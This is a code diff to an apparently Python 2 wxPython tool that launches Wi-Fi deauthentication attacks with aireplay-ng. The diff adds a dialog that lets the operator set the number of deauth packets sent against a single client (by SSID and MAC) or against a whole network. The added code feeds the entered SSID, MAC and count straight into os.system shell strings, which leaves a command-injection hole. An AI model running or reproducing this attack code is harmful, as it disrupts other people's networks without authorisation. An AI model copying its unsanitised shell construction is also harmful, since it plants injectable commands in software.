@@ -584,6 +584,17 @@ sh /usr/local/etc/raddb/certs/bootstrap'''
 				dlg.Destroy()
 				return result
 	
+	def ask2(parent=None, message='',numbers=1, default_value=''):
+				
+				
+				dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
+				
+				
+				dlg.ShowModal()
+				result = dlg.GetValue()
+				dlg.Destroy()
+				return result
+	
 	def configure(self, e):
 		try:
 			
@@ -602,7 +613,9 @@ sh /usr/local/etc/raddb/certs/bootstrap'''
 		#os.system("airmon-ng start wlan0")
 		ssid = str(self.ask(message = 'Enter the SSID')).strip()
 		MAC = str(self.ask(message = 'Enter the MAC')).strip()
-		os.system("aireplay-ng -0 10 -e "+ssid+" -c "+MAC+" "+mon_iface+" --ignore-negative-one &")
+		packet_count = str(self.ask2(message = 'Enter the number of packets to send')).strip()
+		
+		os.system("aireplay-ng -0 "+packet_count+" -e "+ssid+" -c "+MAC+" "+mon_iface+" --ignore-negative-one &")
 		print 'Aireplay against client is started'
 
 	def deauth_ssid(self, e):
@@ -614,8 +627,13 @@ sh /usr/local/etc/raddb/certs/bootstrap'''
 
 		mon_iface = wlan_ifaces[0]
 		#os.system("airmon-ng start wlan0")
-		ssid = str(self.ask(message = 'Enter the SSID')).strip()
-		os.system("aireplay-ng -0 10 -e "+ssid+" "+mon_iface+" --ignore-negative-one &")
+		ssid = str(self.ask2(message = 'Enter the SSID')).strip()
+		packet_count = str(self.ask2(message = 'Enter the number of packets to send')).strip()
+		#~ print "aireplay-ng -0 10 -e "+ssid+" "+mon_iface+" --ignore-negative-one &"
+		#~ print "gnome-terminal -x aireplay-ng -0 10 -e "+ssid+" "+mon_iface+" --ignore-negative-one &"
+		
+		os.system("gnome-terminal -x aireplay-ng -0 "+packet_count+" -e "+ssid+" "+mon_iface+" --ignore-negative-one")
+		
 		print 'Aireplay against whole network started'
 		#~ os.system("airmon-ng stop mon0")
 
